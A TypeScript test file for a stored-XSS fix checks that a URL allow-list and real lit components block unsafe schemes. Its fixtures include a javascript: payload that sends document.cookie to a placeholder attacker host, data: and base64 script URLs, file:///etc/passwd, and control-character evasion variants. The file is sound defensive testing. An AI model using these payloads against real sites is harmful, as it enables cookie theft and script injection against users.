/**
 * Pins for the client-side half of the stored-XSS fix.
 *
 * The server now rejects non-http(s) schemes at the write boundary, but rows
 * written before that check existed are still in the database and are returned
 * verbatim, so the render path has to re-check.
 */
import { existsSync, readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { JSDOM } from 'jsdom';
import { assert } from './assertions.js';
import { SAFE_SCHEMES, safeHref } from './safe-url.js';

/**
 * Resolve web/src. These tests are compiled into .tmp-test/ before running, so
 * import.meta.url points at the build output, not at the sources. Walk up to the
 * directory holding package.json and take src/ from there, which works whether
 * this runs from src/ or from .tmp-test/.
 */
function sourceRoot(): string {
  let dir = fileURLToPath(new URL('.', import.meta.url));
  while (!existsSync(join(dir, 'package.json'))) {
    const parent = dirname(dir);
    if (parent === dir) throw new Error('could not locate web/package.json from ' + import.meta.url);
    dir = parent;
  }
  return join(dir, 'src');
}

/** Repository root: the directory above web/, identified by go.mod. */
function repoRoot(): string {
  let dir = dirname(sourceRoot());
  while (!existsSync(join(dir, 'go.mod'))) {
    const parent = dirname(dir);
    if (parent === dir) throw new Error('could not locate go.mod above ' + sourceRoot());
    dir = parent;
  }
  return dir;
}


const XSS = "javascript:fetch('//attacker/'+document.cookie)";

/**
 * Every one of these must be refused. Note that several are NOT rejected by
 * Go's net/url (which errors on control characters) but ARE normalised by the
 * WHATWG URL parser the browser and this helper use: `new URL('java\tscript:x')`
 * yields protocol 'javascript:'. That divergence is exactly why this has to be
 * an allow-list on the parsed scheme rather than a denylist on the raw string.
 */
function testRejectsUnsafeSchemes(): void {
  const rejected: ReadonlyArray<readonly [string, string]> = [
    ['javascript', 'javascript:alert(1)'],
    ['javascript exfiltration', XSS],
    ['javascript mixed case', 'JaVaScRiPt:alert(1)'],
    ['javascript upper case', 'JAVASCRIPT:alert(1)'],
    ['leading tab', '\tjavascript:alert(1)'],
    ['leading newline', '\njavascript:alert(1)'],
    ['leading space', ' javascript:alert(1)'],
    ['embedded tab', 'java\tscript:alert(1)'],
    ['embedded newline', 'java\nscript:alert(1)'],
    ['embedded carriage return', 'java\rscript:alert(1)'],
    ['data html', 'data:text/html,<script>alert(1)</script>'],
    ['data base64', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
    ['vbscript', 'vbscript:msgbox(1)'],
    ['blob', 'blob:https://example.com/uuid'],
    ['file', 'file:///etc/passwd'],
    // mailto: is a deliberate rejection, not an oversight: the server's
    // allow-list rejects it too, so rendering it would be dead code.
    ['mailto', 'mailto:a@b.com'],
    // Relative and protocol-relative inputs are rejected because there is no
    // base argument. With one, '//evil.com/x' would become an ACCEPTED
    // 'https://evil.com/x'.
    ['protocol relative', '//evil.com/x'],
    ['absolute path', '/relative/path'],
    ['bare word', 'not-a-url'],
    ['http without host', 'http://'],
    ['empty', ''],

    // ── fixtures that isolate the scheme allow-list ─────────────────────────
    //
    // Everything above this line is rejected by BOTH guards, or throws before
    // reaching either, so none of it can tell the allow-list apart from the
    // host check. Measured: with only the rows above, deleting the allow-list
    // outright, or widening it to include javascript:/data:/vbscript:, left
    // the suite GREEN.
    //
    // These four are WHATWG "special" schemes: they parse successfully AND
    // yield a non-empty hostname, so the host check cannot reject them. The
    // allow-list is the only thing that does.
    ['ftp', 'ftp://evil.com/x'],
    ['ws', 'ws://evil.com/x'],
    ['wss', 'wss://evil.com/x'],
    // Also distinguishes membership from a prefix test: a scheme that starts
    // with "http" but is not "http". Guards against `startsWith('http')`.
    ['httpx prefix not membership', 'httpx://evil.com/x'],
  ];

  for (const [name, input] of rejected) {
    assert(
      safeHref(input) === undefined,
      `safeHref(${JSON.stringify(input)}) should be undefined for "${name}", got ${JSON.stringify(safeHref(input))}`,
    );
  }

  assert(safeHref(undefined) === undefined, 'safeHref(undefined) should be undefined');
  assert(safeHref(null) === undefined, 'safeHref(null) should be undefined');
}

function testAcceptsHTTPAndHTTPS(): void {
  const accepted: readonly string[] = [
    'https://github.com/o/r/pull/1',
    'http://example.com/x',
    'HtTpS://example.com',
    'https://example.com:8443/x',
    'https://example.com/x?a=1&b=2#frag',
    'https://user:pass@example.com/x',
  ];
  for (const input of accepted) {
    assert(
      safeHref(input) === input,
      `safeHref(${JSON.stringify(input)}) should return the input unchanged, got ${JSON.stringify(safeHref(input))}`,
    );
  }
}

/**
 * Pins the reachability precondition of safeHref's `hostname === ''` guard.
 *
 * That guard cannot be pinned by a fixture, because no input reaches it: both
 * allow-listed schemes are WHATWG "special" schemes, for which an empty host
 * makes the parse THROW rather than yield an empty hostname. Deleting the
 * guard therefore leaves every behavioural test green, and no fixture can
 * change that -- unreachable code has no behaviour to assert on.
 *
 * What IS pinnable is the condition under which the guard becomes live. Every
 * script-bearing scheme (javascript:, data:, vbscript:, blob:, mailto:) is
 * NON-special and parses with hostname === '', so the guard is precisely what
 * makes an accidental widening of SAFE_SCHEMES fail closed. This test fails
 * the moment a non-special scheme is added to the allow-list -- i.e. the
 * moment the guard stops being unreachable and starts carrying weight.
 */
function testHostGuardIsAFailClosedBackstop(): void {
  assert(SAFE_SCHEMES.size > 0, 'SAFE_SCHEMES is empty; this test would be vacuous');

  for (const scheme of SAFE_SCHEMES) {
    let threw = false;
    try {
      new URL(`${scheme}//`);
    } catch {
      threw = true;
    }
    assert(
      threw,
      `${scheme} is a non-special scheme: "${scheme}//" parses with an empty host instead of ` +
        'throwing. safeHref\'s hostname==="" guard is now REACHABLE and load-bearing, so it ' +
        'needs a real rejection fixture -- and adding a non-special scheme to SAFE_SCHEMES is ' +
        'itself almost certainly a mistake, since every script-bearing scheme is non-special.',
    );
  }

  // Positive control: the detector must actually be able to see a non-special
  // scheme. Without this, the loop above would pass if `new URL` threw for
  // everything, or if the set were silently unreadable.
  let nonSpecialThrew = false;
  try {
    new URL('javascript://');
  } catch {
    nonSpecialThrew = true;
  }
  assert(
    !nonSpecialThrew,
    'positive control: "javascript://" should parse (non-special schemes tolerate an empty ' +
      'host); if it throws, this test can no longer tell special from non-special schemes',
  );
  assert(
    new URL('javascript://').hostname === '',
    'positive control: a non-special scheme should yield hostname === "", which is the ' +
      'condition the guard under test exists to catch',
  );
}

interface URLSchemeCase {
  readonly name: string;
  readonly input: string;
  readonly server: 'accept' | 'reject';
  readonly client: 'accept' | 'reject';
  readonly note?: string;
}

/**
 * The CLIENT half of the server/client differential pin.
 *
 * The other half is TestValidateURLFieldMatchesSharedFixtures in
 * internal/server/urlvalidate_differential_test.go. Both read the same
 * testdata/url-scheme-cases.json; that one asserts the "server" column against
 * validateURLField, this one asserts the "client" column against safeHref.
 *
 * Why the file is shared rather than each side keeping its own table: two
 * independent tables can both be green while disagreeing with each other, which
 * is exactly the state this branch shipped in. safe-url.ts asserted the two
 * guards agreed and concluded that "a scheme the client allows and the server
 * rejects is unreachable". The scheme SETS agree. The DECISIONS do not: 9 of
 * these 42 inputs are decided differently. Now neither side can move without
 * turning its own half red, and reconciling them on paper turns
 * TestSharedFixturesRecordRealDivergences red.
 *
 * This also subsumes the low-severity gaps in the rejection table: control
 * characters, case folding, and a bare space are all fixtures here, decided
 * against a recorded expectation rather than lumped into a single "must be
 * rejected" loop that cannot say WHY something was rejected.
 */
function testSharedFixturesMatchClientColumn(): void {
  const path = join(repoRoot(), 'testdata', 'url-scheme-cases.json');
  const doc = JSON.parse(readFileSync(path, 'utf8')) as { cases?: readonly URLSchemeCase[] };
  const cases = doc.cases ?? [];

  assert(cases.length > 0, `${path} contains no cases; this test would be vacuous`);

  let divergent = 0;
  for (const c of cases) {
    assert(
      c.client === 'accept' || c.client === 'reject',
      `fixture ${JSON.stringify(c.name)} has an invalid "client" value ${JSON.stringify(c.client)}`,
    );
    const got = safeHref(c.input) === undefined ? 'reject' : 'accept';
    assert(
      got === c.client,
      `safeHref(${JSON.stringify(c.input)}) = ${got}, but testdata/url-scheme-cases.json ` +
        `records ${c.client} for "${c.name}". Either safeHref's policy changed (update the ` +
        'fixture and say why), or this is a regression.',
    );
    if (c.server !== c.client) divergent++;
  }

  // Anti-vacuity, and the same control the Go half applies from the other side:
  // if the divergences were quietly edited away, this loop would still pass
  // while the claim it defends in safe-url.ts became untrue in the other
  // direction.
  assert(
    divergent > 0,
    `${path} records no server/client divergences. safe-url.ts's comment says the two guards ` +
      'disagree and points here for the evidence; if that is no longer true, update the comment ' +
      'deliberately rather than letting this test pass over an empty set.',
  );
}

/**
 * Install a JSDOM window as the global environment.
 *
 * This has to happen BEFORE lit or any component module is loaded: lit
 * evaluates DOM globals at module scope, and the component modules call
 * customElements.define() via @customElement as a side effect of being
 * imported. Hence the dynamic import()s in the test below rather than
 * top-of-file static imports.
 */
function installDOMGlobals(dom: InstanceType<typeof JSDOM>): void {
  for (const key of Object.getOwnPropertyNames(dom.window)) {
    if (key in globalThis) continue;
    try {
      (globalThis as Record<string, unknown>)[key] = (dom.window as unknown as Record<string, unknown>)[key];
    } catch {
      // Some window properties are getter-only; none of those are needed here.
    }
  }
  (globalThis as Record<string, unknown>).window = dom.window;
  (globalThis as Record<string, unknown>).document = dom.window.document;
}

let sharedDOM: InstanceType<typeof JSDOM> | undefined;

/**
 * One JSDOM window for the whole file. It has to be a singleton: custom
 * elements are registered against whatever `customElements` is global at import
 * time, so a second window would leave the already-registered components bound
 * to the first one.
 */
function domEnvironment(): InstanceType<typeof JSDOM> {
  if (sharedDOM === undefined) {
    sharedDOM = new JSDOM('<!doctype html><body><div id="host"></div></body>', {
      pretendToBeVisual: true,
      url: 'https://dashboard.test/',
    });
    installDOMGlobals(sharedDOM);
  }
  return sharedDOM;
}

/**
 * The behavioural pin: a persisted javascript: URL must not reach the href
 * attribute of a real DOM node.
 *
 * This drives the two REAL production render functions --
 * ft-inspector-code.ts::renderPrLink and
 * ft-inspector-meta.ts::renderExternalSourceLink -- through lit's render() into
 * a real JSDOM tree, and reads the attribute back off the resulting node.
 *
 * It previously declared its own renderGuarded() copy of the guarded shape
 * inside this file and asserted against that. That version was decorative:
 * changing `const href = safeHref(url)` to `const href = url` in EITHER
 * production function shipped green, because neither function was ever
 * imported. A check that derives from the thing it is checking cannot falsify
 * it. The copy is gone; these assertions now fail if either real function
 * stops calling safeHref.
 */
async function testPayloadNeverReachesHrefAttribute(): Promise<void> {
  const dom = domEnvironment();

  const { render } = await import('lit');
  const { renderPrLink } = await import('../components/inspector/ft-inspector-code.js');
  const { renderExternalSourceLink } = await import('../components/inspector/ft-inspector-meta.js');

  const doc = dom.window.document;
  const host = doc.getElementById('host')!;

  const cases: ReadonlyArray<{
    readonly name: string;
    readonly renderBad: () => void;
    readonly renderGood: () => void;
    readonly good: string;
  }> = [
    {
      name: 'ft-inspector-code.ts::renderPrLink',
      renderBad: () => render(renderPrLink(XSS, 'PR-1'), host),
      renderGood: () => render(renderPrLink('https://github.com/o/r/pull/1', 'PR-1'), host),
      good: 'https://github.com/o/r/pull/1',
    },
    {
      name: 'ft-inspector-meta.ts::renderExternalSourceLink',
      renderBad: () => render(renderExternalSourceLink(XSS), host),
      renderGood: () => render(renderExternalSourceLink('https://example.com/x'), host),
      good: 'https://example.com/x',
    },
  ];

  for (const c of cases) {
    c.renderBad();
    assert(
      host.querySelector('a') === null,
      `${c.name}: a javascript: URL must not produce an anchor at all, got: ${host.innerHTML}`,
    );
    assert(
      host.querySelector('[href]') === null,
      `${c.name}: no element should carry an href attribute, got: ${host.innerHTML}`,
    );
    // Degrade, do not drop: the rejected value stays visible to the user. Both
    // functions surface it in a title attribute on an inert element.
    const inert = host.querySelector('[title]');
    assert(
      inert !== null && (inert.getAttribute('title') ?? '').includes(XSS),
      `${c.name}: rejected URL should stay visible in a title attribute, got: ${host.innerHTML}`,
    );

    // Positive control, and note what it controls: it controls THIS harness --
    // that lit + JSDOM + these real functions can produce an href at all. If
    // this failed, the "no href" assertions above would be passing vacuously,
    // for example because render() silently no-opped. It does NOT control the
    // guard; the assertions above do.
    c.renderGood();
    const anchor = host.querySelector('a');
    assert(
      anchor !== null,
      `${c.name}: positive control -- a legitimate https URL must produce an anchor`,
    );
    assert(
      anchor!.getAttribute('href') === c.good,
      `${c.name}: positive control -- href should be ${c.good}, got ${anchor!.getAttribute('href')}`,
    );
    assert(
      anchor!.getAttribute('target') === '_blank' && anchor!.getAttribute('rel') === 'noopener',
      `${c.name}: positive control -- the rendered anchor must keep target="_blank" rel="noopener", got: ${host.innerHTML}`,
    );
  }
}

/** Minimal shape of a LitElement instance, for a node made by createElement. */
interface LitLike extends HTMLElement {
  codeContext: unknown;
  updateComplete: Promise<unknown>;
}

/**
 * The guard must hold for EVERY pull request in the list, not just the first.
 *
 * testPayloadNeverReachesHrefAttribute drives renderPrLink one call at a time,
 * so it cannot see a list bug: a template that guarded pullRequests[0] and
 * interpolated the rest raw would pass it. This renders the REAL
 * <ft-inspector-code> custom element -- its own .map() over ctx.pullRequests,
 * not a copy of it -- with a two-element list, in both orderings.
 *
 * Both orderings matter. Poisoned-first catches "the loop bails out after the
 * first rejection"; poisoned-second catches "only index 0 is guarded".
 */
async function testGuardHoldsForEveryItemInAList(): Promise<void> {
  const dom = domEnvironment();
  // Importing the module is what registers <ft-inspector-code>, via @customElement.
  await import('../components/inspector/ft-inspector-code.js');

  const doc = dom.window.document;
  const good = 'https://github.com/acme/widgets/pull/2';

  const orderings: ReadonlyArray<{ readonly name: string; readonly urls: readonly string[] }> = [
    { name: 'poisoned first', urls: [XSS, good] },
    { name: 'poisoned second', urls: [good, XSS] },
  ];

  for (const { name, urls } of orderings) {
    const el = doc.createElement('ft-inspector-code') as LitLike;
    el.codeContext = {
      repo: 'acme/widgets',
      branch: 'main',
      pullRequests: urls.map((url, i) => ({ url, id: `PR-${i + 1}`, status: 0 })),
    };
    doc.getElementById('host')!.appendChild(el);
    await el.updateComplete;

    const root = el.shadowRoot;
    assert(root !== null, `${name}: component rendered no shadow root`);

    const hrefs = [...root!.querySelectorAll('[href]')].map((a) => a.getAttribute('href'));
    assert(
      hrefs.length === 1 && hrefs[0] === good,
      `${name}: exactly one href should survive the list, the legitimate one. Got ${JSON.stringify(hrefs)}. ` +
        'If both survived, the list is interpolating raw URLs; if neither did, see the control below.',
    );

    // Degrade, do not drop: the rejected entry is still rendered, still shows
    // its id, and still exposes the raw value.
    const unsafe = root!.querySelector('.pr-link-unsafe');
    assert(
      unsafe !== null && (unsafe.getAttribute('title') ?? '').includes(XSS),
      `${name}: the rejected PR should render as inert text carrying the raw URL in a title, got: ${root!.innerHTML}`,
    );

    // Positive control for THIS harness: the component must render both list
    // items at all. Without it, "exactly one href" would also be satisfied by a
    // component that silently dropped every item after the first.
    const items = root!.querySelectorAll('.pr-item');
    assert(
      items.length === 2,
      `${name}: positive control -- the component should render both list items, got ${items.length}. ` +
        'The href assertion above is vacuous unless both items are actually in the tree.',
    );

    el.remove();
  }
}

/**
 * target="_blank" is currently an incidental mitigation on both anchors: engines
 * block javascript: navigation into a new browsing context, but nothing pinned
 * that attribute, so removing it would quietly change the severity of any URL
 * that slipped past the scheme checks. This pins it.
 */
function testExternalAnchorsKeepTargetBlank(): void {
  const files = [
    'components/inspector/ft-inspector-code.ts',
    'components/inspector/ft-inspector-meta.ts',
  ];
  const src = sourceRoot();

  for (const rel of files) {
    const text = readFileSync(join(src, rel), 'utf8');
    const anchors = text.split('\n').filter((l) => l.includes('href=${href}'));
    assert(anchors.length > 0, `${rel}: expected a guarded href=\${href} anchor, found none`);
    for (const line of anchors) {
      assert(
        line.includes('target="_blank"'),
        `${rel}: guarded anchor lost target="_blank": ${line.trim()}`,
      );
      assert(
        line.includes('rel="noopener"'),
        `${rel}: guarded anchor lost rel="noopener": ${line.trim()}`,
      );
    }
  }
}

async function run(): Promise<void> {
  testRejectsUnsafeSchemes();
  testAcceptsHTTPAndHTTPS();
  testHostGuardIsAFailClosedBackstop();
  testSharedFixturesMatchClientColumn();
  await testPayloadNeverReachesHrefAttribute();
  await testGuardHoldsForEveryItemInAList();
  testExternalAnchorsKeepTargetBlank();
  console.log('safe-url: ok');
}

await run();
